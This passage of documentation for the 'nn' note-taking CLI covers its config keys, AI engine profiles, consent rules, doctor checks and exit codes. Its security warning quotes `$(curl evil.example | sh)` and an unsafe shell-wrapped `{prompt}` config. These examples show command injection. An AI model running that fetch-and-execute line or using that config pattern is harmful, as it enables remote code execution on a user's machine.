| `search.limit` | int | `20` | >= 1 |  | Results nn s prints. |
| `search.layout_fallback` | bool | `true` |  |  | Retry a query typed in the other keyboard layout. |
| `ls.sort` | enum | `"modified"` | modified, date, opened, title |  | Order of nn ls. |
| `ls.limit` | int | `0` | >= 0 |  | Rows nn ls prints; 0 is all. |
| `show.images` | enum | `"auto"` | auto, never |  | Inline images in nn show. |
| `show.ocr` | bool | `false` |  |  | Print the OCR text under each image in nn show. |
| `graph.format` | enum | `"mermaid"` | mermaid, dot, json |  | Format of nn graph. |
| `stats.by` | enum | `"week"` | tag, week, month, repo, via |  | Breakdown of nn stats. |
| `output.color` | enum | `"auto"` | auto, always, never |  | Color in output; NO_COLOR is stronger. |
| `obsidian.check` | bool | `true` |  |  | nn doctor checks that the vault is registered in Obsidian. |
| `state.track_opens` | bool | `true` |  |  | Record note opens, for ranking and --sort opened. |
| `state.half_life` | duration | `"14d"` | > 0 |  | Half-life of a recorded open in ranking. |
| `notify.enabled` | bool | `true` |  |  | Desktop notifications. |
| `ai.mode` | enum | `"background"` | auto, wait, background |  | Capture AI: wait before saving, or background after; auto waits on a terminal. |
| `ai.profile` | string | `"claude"` |  |  | Default AI profile. |
| `ai.timeout` | duration | `"120s"` | > 0 |  | Default AI run timeout. |
| `ai.context.notes` | int | `8` | >= 1 |  | Most notes whose excerpts the model gets. |
| `ai.context.chars` | int | `12000` | >= 1000 |  | Most characters of excerpts the model gets. |
| `ai.context.search_rounds` | int | `1` | 0..3 |  | Follow-up searches the model may ask nn for. |
| `ai.profiles.NAME.engine` | enum | `"claude"` | claude, codex, command |  | Engine; built-in profiles claude and codex keep their own. |
| `ai.profiles.NAME.model` | string | `""` |  |  | Model; empty: engine default. The built-in claude profile uses sonnet. |
| `ai.profiles.NAME.effort` | enum | `""` | low, medium, high, max |  | Reasoning effort; empty: engine default. |
| `ai.profiles.NAME.command` | list | `[]` |  |  | Argv for engine command, with {prompt} {image} {model} {effort}. |
| `ai.profiles.NAME.timeout` | duration | `""` | > 0 |  | Run timeout; empty: ai.timeout. |
| `ai.tasks.TASK.profile` | string | `""` |  |  | Profile for the task; empty: ai.profile. |
| `ai.tasks.TASK.run` | enum | `"always"` | always, flag, never; TASK: shot, title |  | shot and title only: always, only with --ai (flag), or never. |
| `ai.tasks.TASK.prompt_file` | path | `""` |  |  | File whose text replaces the built-in prompt. |
| `ai.tasks.TASK.image` | enum | `"discard"` | discard, embed; TASK: shot |  | shot only: keep the screenshot in the note (embed) or not. |
| `ai.consent.KEY` | enum | `"ask"` | ask, always, never |  | Consent to run an engine; KEY: claude, codex or a command profile. |
| `[tui]` | table, reserved |  |  |  | Reserved for the terminal UI; its keys are ignored. |

<!-- config-table:end -->

Data layout under the vault root:

```text
<root>/<inbox>/*.md              new notes
<root>/<inbox>/assets/           images
<root>/<inbox>/_templates/*.md   templates (not searched, listed or graphed)
<root>/.nn/ocr/<image>.txt       OCR text sidecar
<root>/.nn/ocr/<image>.json      OCR sidecar with boxes and confidence
```

`nn`'s own state, outside the vault:

```text
$XDG_DATA_HOME/nn/state.json   open frequency, for --sort opened and ranking
```

Environment variables:

| Variable | Effect |
| --- | --- |
| `NN_ROOT` | overrides the vault root from the config file |
| `NN_CONFIG` | overrides the config file's own path |
| `NN_INBOX` | set for external `nn-<verb>` subcommands (not read by `nn` itself) |
| `NN_VISION_HELPER` | path to the `nn-vision` binary, instead of the usual search order |
| `NN_AI` | the AI profile every task runs on, over `ai.tasks.TASK.profile` and `ai.profile` |
| `OMARCHY_OCR_LANGS` | OCR languages when `ocr.langs` is empty; read on macOS and Linux alike |
| `XDG_CONFIG_HOME` | base for the config file when `NN_CONFIG` is unset |
| `XDG_DATA_HOME` | base for `nn`'s state file, and for `$XDG_DATA_HOME/nn/nn-vision` in the helper search order |

## AI engines

```sh
nn setup ai
nn doctor
```

A task (`ai.tasks.TASK`) runs on a profile: `NN_AI` if set, else
`ai.tasks.TASK.profile`, else `ai.profile` (default `claude`). Two profiles
always exist and use your own login: `claude` (Claude Code; model `sonnet`
unless the profile sets another) and `codex` (Codex CLI; codex picks the
model). A profile with `engine = "command"` runs your own program (see
[Command profiles](#command-profiles)).

codex costs more per call than claude: about 8.8k input tokens of its own
against about 0.5k. Your `~/.codex/AGENTS.md` goes with every call; it cannot
be left out without risking codex's login.

claude gets the task's prompt (built-in or from `ai.tasks.TASK.prompt_file`) on
its command line (`--system-prompt`), where other users of the machine can see
it with `ps`. Keep secrets out of a `prompt_file`. The content itself goes to
claude and codex through stdin.

### Consent

nn sends nothing to an engine without consent, stored in `ai.consent.KEY`.
`KEY` is `claude` or `codex` (one entry for every profile on that engine) or
the name of a command profile. Values:

- `ask` (the default): when stdin and stderr are both terminals, nn asks first.
  It says what it will send, where (for codex, that `~/.codex/AGENTS.md` goes
  too) and where the answer is stored. `always` sends and saves the answer,
  `once` sends this time only, `never` sends nothing and saves that. Answers
  are whole words in any case; anything else, or no answer, sends nothing.
  `always` and `never` hold for the rest of that run even if nn cannot save
  them, and nn then prints the line to add to the config by hand. For a profile
  name with a dot, which nn never saves, the question shows both lines itself.
  Without a terminal, nothing is asked or sent.
- `always`: nn sends without asking.
- `never`: nn sends nothing.

Consent is per engine, not per task: `always` lets every task send to it. What
each task sends:

- `shot`: the screenshot, its OCR text and existing vault tags
- `title`: new note text or OCR, an optional source image and existing vault tag names
- `ask`: your question and the paths, titles, tags and excerpts of the notes nn finds for it
- `filter`: your instruction and the text piped to nn ai
- `last`: the previous command you provide and its optional output
- `triage`: excerpts and metadata of selected inbox notes and related notes
- `url`: the link, the text of the page it points to and existing vault tag names
- `digest`: your selection and excerpts and metadata of the notes the digest covers

`nn setup ai` goes through `claude`, `codex` and each command profile. For each
it shows where the program is (or that it is not installed), its consent and
what each task sends; a command without `{image}` gets no `shot` line, since it
cannot receive the screenshot. For every program it finds, it asks `always`,
`never` or `skip`. `skip`, an empty answer or three unknown answers in a row
leave the consent unchanged. Without a terminal it asks nothing, shows how to
allow each found program not yet on `always`, and exits 2 (0 if there is none).
If it cannot write a consent, it prints the line to add by hand on stderr, goes
on with the other entries, and exits 1. Like `nn config`, it works before
`vault.root` is set.

Consent hints from `nn setup ai`, `nn doctor` and a refused engine suggest
`nn config ai.consent.KEY VALUE` only for names TOML accepts without quotes
(letters, digits, `_` and `-`). Other names get the line to add under
`[ai.consent]` by hand, such as `"my box" = "always"`, and also a pointer to
`nn setup ai` unless the name has a dot.

### Doctor

`nn doctor` checks the profiles in use (`ai.profile` and each task's profile,
`NN_AI` included) without running a model, asking anything or writing the
config. Each consent entry among them gets one `ai` row, and a task gets a row
when its image or `prompt_file` cannot work. These rows are problems and set
the exit code to 1:

- a program not installed while its consent is `ask` or `always`;
- `KEY not approved`: consent is still `ask` for an installed program (fix:
  `nn setup ai`, or for a profile name with a dot the line to add by hand);
- an `ai.tasks.TASK.prompt_file` that is not a regular, non-empty file of at
  most 64 KiB;
- `shot` on a command profile without `{image}`, unless `ai.tasks.shot.run` or
  that profile's consent is `never`;
- `NN_AI` naming a profile that does not exist.

These are informational and do not affect the exit code:

- consent `never`: nothing is sent, and the program is not checked;
- where the program is, when its consent is `always`;
- codex's cost per call, when a profile in use runs on codex.

A command profile with no command is reported once, with the config's other
problems.

### Command profiles

```toml
[ai.profiles.local]
engine = "command"
command = ["my-model", "--model", "{model}"]
model = "small"
timeout = "60s"
```

`command` is the program and its arguments. It runs as is, without a shell, in
an empty temporary directory; its consent is `ai.consent.local`. In each
argument after the program, nn replaces `{prompt}` with the prompt (the task's
prompt, a blank line, then the content), `{image}` with the image path (empty
when there is none), `{model}` with the profile's model and `{effort}` with its
effort (`low`, `medium`, `high`, `max`). Without `{prompt}` in any argument,
the prompt goes to stdin. A command without `{image}` cannot be sent an image.

For capture tasks, the answer is the program's stdout. A JSON object with any
of `title`, `tags` (a list of strings) and `body` sets those fields; anything
else, plain text or JSON of another shape, becomes the body as is. An empty
answer is an error. A non-zero exit fails the run with the last line of stderr.
More than 4 MiB on stdout or on stderr stops the run, and so does the profile's
`timeout` (else `ai.timeout`); the program is killed together with its process
group.

Other tasks need a strict JSON reply from every engine, command profiles
included, and a custom prompt for them must keep the contract:

- `ask`: `action` (`answer`, `search` or `insufficient`), `query`, `paragraphs`
  and `missing`; each paragraph has `text` and `source_ids`. All fields are
  required, empty when unused. An answer may cite only source IDs from that
  request. Plain text, unknown fields and invalid search or citation requests
  fail, with no retry.
- `filter`: exactly `{"text":"the result"}`. The text is printed unchanged, so
  JSON inside it stays output. Empty text is valid; missing, null or duplicate
  fields and plain text are errors. Keep this envelope even when the requested
  result is JSON.
- `last`: exactly `title`, `tags` and `body`, all required. Title and tags may
  be empty; body must contain visible text. There is no capture-style fallback.
  The same reply gives the metadata for `--save`.
- `triage`: `action`, `query` and `proposals`. `search` has a bounded query and
  no proposals; `propose` has no query and may have an empty list. Each
  proposal has `note_id`, `title`, `tags`, `links`, `topic` and `reason`, all
  required. Links are supplied source IDs, never paths. Only missing titles,
  new tags and validated links become selectable additions.
- `url`: exactly `title`, `tags` and `body`, as for `last`; plain stdout from a
  command profile is rejected. The input is one JSON object with `url`,
  `page_title`, `description`, `text`, `truncated` and `existing_tags`.

Prefer stdin to `{prompt}`. An argument puts the note's text on the command
line, where other users can see it with `ps`, and on Linux a single argument
over about 128 KiB is refused (`E2BIG`), so a long note would not get through.
Through stdin the text is neither visible nor limited that way.

Never put `{prompt}` inside a shell script. The prompt is pasted in as is, so
with this command a note containing `$(curl evil.example | sh)` runs it:

```toml
command = ["sh", "-c", "llm \"{prompt}\""]   # never do this
```

A program that needs a shell should take the prompt as a separate argument that
the script only quotes, or read it from stdin with no `{prompt}`:

```toml
command = ["sh", "-c", "llm \"$1\"", "sh", "{prompt}"]
```

## Exit codes

| Code | Meaning |
| --- | --- |
| `0` | success |
| `1` | nothing found (`s`, `ls`, `links`, `backlinks`, `code`, `snip`, `tags`, `digest`, or `nn config KEY` for an entry that is not set); `ask` without enough evidence; `doctor` found a problem; `config` or `setup ai` could not write a value and printed the line to add by hand |
| `2` | usage error, or a refused action (a likely secret without `--allow-secret`) |
| `130` | interrupted (Ctrl+C); any temp file is cleaned up |

## Limitations and known nuances

- Apple Vision does not recognize Mac modifier glyphs: a lone command symbol
  reads as `#`, a lone shift symbol as `1`, and a line of only such glyphs is
  often dropped. A screenshot of a hotkey table is still searchable by action
  names, but not reliably by glyph-only shortcuts. Shortcuts written in ASCII
  (`Cmd+Shift+4`, `Ctrl+Alt+T`) are recognized normally by both engines.
- On Linux, screenshots and the clipboard have separate requirements, and
  `nn doctor` checks each and prints the install command for your distribution:
  - `nn shot` needs `grim` + `slurp` (wlroots compositors: Hyprland, Sway,
    river), `spectacle` (KDE), `gnome-screenshot` (GNOME), or `maim` or
    `import` (ImageMagick) on X11, depending on the session. With none
    available, `nn` suggests taking the screenshot to the clipboard with the
    system tool and running `nn add --clip`.
  - `nn add --clip` reads images through `wl-paste` (`wl-clipboard`) on Wayland
    or `xclip` on X11, and plain text when there is no image. On X11, `xsel`
    alone is enough for text; images need `xclip`. `--copy-text`,
    `nn code --copy` and `nn snip --copy` write through `wl-copy`, `xclip` or
    `xsel`.
  - Omarchy is detected automatically (it has everything needed), and
    `nn doctor` says so instead of suggesting packages.
- `nn snip`'s interactive picker and `{{placeholder}}` prompts need `/dev/tty`.
  Without it (scripts, `cron`), a query matching several snippets takes the
  best-ranked one (noted on stderr), and a placeholder with neither `--set` nor
  a default fails with exit code 2, listing what is missing.
- Vaults of many thousands of notes and images have not been benchmarked.
  Search targets under 300 ms at about 10,000 documents.
- Obsidian does not need to be running or installed. Only `nn open` and
  `nn doctor`'s registration check depend on it.
- A bare `https://` link in an `nn url` summary is left as is, so Obsidian
  shows it as a clickable link, like the `Source:` line. Nothing loads until
  you click it, but the summary is model output: check where such a link points
  before you follow it.
